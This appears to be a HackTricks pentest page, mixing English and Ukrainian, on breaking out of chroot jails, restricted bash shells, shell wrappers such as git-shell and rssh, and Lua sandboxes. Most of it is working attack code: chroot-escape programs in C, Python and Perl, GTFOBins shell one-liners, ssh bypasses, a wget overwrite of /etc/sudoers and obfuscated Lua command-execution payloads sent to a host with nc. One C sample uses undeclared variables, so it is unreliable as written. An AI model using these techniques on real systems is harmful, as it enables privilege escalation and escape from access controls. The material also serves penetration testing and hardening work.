# Escape from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Escape from Chroot

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
Зазвичай це означає, що для escape вам потрібно бути root усередині chroot.

> [!TIP]
> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following сценарії та виконати escape з `chroot`.<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
>
> Це відбувається тому, що зазвичай chroot НЕ переміщує вашу робочу директорію до вказаної, тому ви можете створити chroot, але залишитися поза ним.

Зазвичай усередині chroot jail ви не знайдете binary `chroot`, але ви **можете скомпілювати, завантажити та виконати** binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Це схоже на попередній випадок, але тут **атакер зберігає файловий дескриптор поточного каталогу**, а потім **створює chroot у новій папці**. Зрештою, оскільки він має **доступ** до цього **FD** **за межами** chroot, він отримує до нього доступ і **виходить**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD можна передавати через Unix Domain Sockets, тому:
>
> - Створіть дочірній процес (fork)
> - Створіть UDS, щоб батьківський і дочірній процеси могли взаємодіяти
> - Виконайте chroot у дочірньому процесі в іншій директорії
> - У батьківському процесі створіть FD директорії, яка знаходиться за межами chroot нового дочірнього процесу
> - Передайте цей FD дочірньому процесу за допомогою UDS
> - Дочірній процес виконає chdir до цього FD, і оскільки він знаходиться за межами його chroot, процес вийде з jail

### Root + Mount

> [!WARNING]
>
> - Змонтуйте root device (/) у директорію всередині chroot
> - Виконайте chroot до цієї директорії
>
> Це можливо в Linux

### Root + /proc

> [!WARNING]
>
> - Змонтуйте procfs у директорію всередині chroot (якщо його ще не змонтовано)
> - Знайдіть pid, який має інший root/cwd entry, наприклад: /proc/1/root
> - Виконайте chroot до цього entry

### Root(?) + Fork

> [!WARNING]
>
> - Створіть Fork (дочірній процес), виконайте chroot до іншої директорії глибше у FS і перейдіть до неї
> - Із батьківського процесу перемістіть директорію, у якій знаходиться дочірній процес, до директорії перед chroot дочірнього процесу
> - Цей дочірній процес опиниться за межами chroot

### ptrace

> [!WARNING]
>
> - Раніше користувачі могли налагоджувати власні процеси з іншого власного процесу... але тепер це більше не дозволено за замовчуванням
> - У будь-якому разі, якщо це можливо, ви можете виконати ptrace для процесу та запустити shellcode всередині нього ([дивіться цей приклад](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Отримайте інформацію про jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Зміна PATH

Перевірте, чи можете ви змінити змінну середовища PATH<sup>[[2]](#references)</sup>.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Використання vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers і help viewers

У багатьох обмежених середовищах усе ще доступні **pagers** або **help viewers**. Зазвичай ними швидше зловживати, ніж намагатися відновити `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Якщо `git` доступний, пам’ятайте, що його вивід довідки зазвичай проходить через pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Поширені однорядкові команди GTFOBins

Після того як ви визначили, які бінарні файли доступні, спочатку перевірте очевидні засоби запуску shell:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Якщо ви можете лише **інжектити аргументи** в дозволену команду (замість того, щоб вільно її запускати), також перевірте **GTFOArgs**.

### Створення скрипту

Перевірте, чи можете ви створити виконуваний файл із вмістом _/bin/bash_
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Отримання bash через SSH

Якщо ви отримуєте доступ через ssh, часто можна попросити сервер виконати **іншу програму** замість обмеженої оболонки входу:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Якщо `ssh` є одним із небагатьох локально дозволених бінарних файлів, пам’ятайте, що його також можна зловживати як **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Можна, наприклад, перезаписати файл sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Обмежені shell-обгортки (`git-shell`, `rssh`, `lshell`)

У деяких середовищах ви потрапляєте не у звичайний `rbash`, а в **обгортки**, такі як `git-shell`, `rssh` або `lshell`:

- `git-shell` приймає лише серверні Git-команди та все, що знаходиться всередині `~/git-shell-commands/`. Якщо цей каталог існує, виконайте `help`, щоб перелічити дозволені користувацькі дії. Якщо ви можете **писати** туди, будь-який виконуваний файл, розміщений у цьому каталозі, стає доступним.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` зазвичай дозволяють лише операції `scp`, `sftp`, `rsync` або в стилі Git. У таких випадках спочатку зосередьтеся на **примітивах запису файлів**: завантажте `authorized_keys`, файл запуску shell або допоміжний скрипт у доступне для запису місце, а потім повторно підключіться за допомогою `ssh -t ...`.
- Якщо обгортка лише фільтрує командний рядок, перелічіть доступні бінарні файли, а потім перейдіть до **GTFOBins / GTFOArgs**.

### Інші трюки

Також перевірте:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Також може бути цікавою ця сторінка:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Трюки щодо виходу з Python jails наведені на цій сторінці:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

На цій сторінці можна знайти глобальні функції, до яких ви маєте доступ усередині Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval із виконанням команд:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Кілька прийомів, щоб **викликати функції бібліотеки без використання крапок**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Перелічіть функції бібліотеки:
```bash
for k,v in pairs(string) do print(k,v) end
```
Зверніть увагу, що щоразу, коли ви виконуєте попередній one-liner у **іншому lua environment, порядок функцій змінюється**. Тому, якщо вам потрібно виконати певну функцію, ви можете здійснити brute force attack, завантажуючи різні lua environments і викликаючи першу функцію бібліотеки le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Отримати інтерактивний lua shell**: Якщо ви перебуваєте в обмеженому lua shell, ви можете отримати новий lua shell (і, сподіваємося, необмежений), виконавши:
```bash
debug.debug()
```
## Посилання

- [1] [Chw00t: How To Break Out from Various Chroot Solutions (Bucsay Balazs, доповідь і слайди DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Документація Git](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
